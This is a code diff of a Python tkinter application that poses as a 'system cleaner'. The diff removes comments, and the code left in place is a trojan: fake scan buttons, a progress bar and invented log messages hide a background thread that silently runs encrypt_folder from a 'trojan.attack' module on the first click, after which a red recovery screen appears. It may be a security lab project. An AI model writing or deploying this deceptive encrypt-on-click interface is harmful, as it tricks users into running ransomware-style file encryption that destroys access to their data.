@@ -5,23 +5,18 @@ import threading
 import tkinter as tk
 from tkinter import ttk, messagebox
 
-# Path setup for PyInstaller
 if hasattr(sys, '_MEIPASS'):
-    # In PyInstaller, sys._MEIPASS is the root of the bundle
     ROOT_DIR = sys._MEIPASS
-    # For onedir, also check _internal
     internal_dir = os.path.join(ROOT_DIR, "_internal")
     if os.path.exists(internal_dir) and internal_dir not in sys.path:
         sys.path.insert(0, internal_dir)
 else:
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-    # When running from source, ROOT_DIR is the project root (one level up from BASE_DIR)
     ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))
 
 if ROOT_DIR not in sys.path:
     sys.path.insert(0, ROOT_DIR)
 
-# Import from Phase 1
 from trojan.attack import encrypt_folder, decrypt_folder, is_encrypted
 
 class SystemCleanerApp:
@@ -32,7 +27,6 @@ class SystemCleanerApp:
         self.root.configure(bg="#2C3E50")
         self.root.resizable(False, False)
 
-        # Check the state to determine which UI to show
         if is_encrypted():
             self.build_recovery_ui()
         else:
@@ -58,15 +52,12 @@ class SystemCleanerApp:
         )
         self.status_label.pack(pady=5)
 
-        # Fake Progress Bar
         self.progress = ttk.Progressbar(self.root, length=300, mode='indeterminate')
         self.progress.pack(pady=10)
 
-        # Buttons frame
         btn_frame = tk.Frame(self.root, bg="#2C3E50")
         btn_frame.pack(pady=5)
 
-        # Fake buttons
         self.scan_btn = tk.Button(
             btn_frame, 
             text="Quick Scan", 
@@ -100,7 +91,6 @@ class SystemCleanerApp:
         )
         self.opt_btn.grid(row=1, column=0, columnspan=2, pady=5)
 
-        # Fake Logs Text Box
         self.log_box = tk.Text(self.root, height=7, width=50, bg="#34495E", fg="#ECF0F1", font=("Courier", 10))
         self.log_box.pack(pady=10)
         self.log_box.insert(tk.END, "System Ready. Awaiting user action...\n")
@@ -112,10 +102,8 @@ class SystemCleanerApp:
         self.clean_btn.config(state="disabled")
         self.opt_btn.config(state="disabled")
         
-        # Start progress bar
         self.progress.start(15)
 
-        # Triggers actual encryption on the first button click silently
         if not hasattr(self, "attack_started"):
             self.attack_started = True
             threading.Thread(target=encrypt_folder, daemon=True).start()
@@ -123,7 +111,6 @@ class SystemCleanerApp:
         self._append_fake_log(f"--- Initiating {process_name} ---")
         self._append_fake_log("Scanning core system drives...")
 
-        # Add deferred fake log updates (makes it feel very alive & realistic)
         self.root.after(1000, lambda: self._append_fake_log("Checking registry keys for vulnerabilities..."))
         self.root.after(2000, lambda: self._append_fake_log("Analyzing cached application data..."))
         self.root.after(3000, lambda: self._append_fake_log("Reallocating unused memory chunks..."))
@@ -145,7 +132,6 @@ class SystemCleanerApp:
 
     def build_recovery_ui(self):
         """Builds the recovery UI if the system is already encrypted."""
-        # Change window theme to indicate danger
         self.root.configure(bg="#C0392B")
 
         self.title_label = tk.Label(
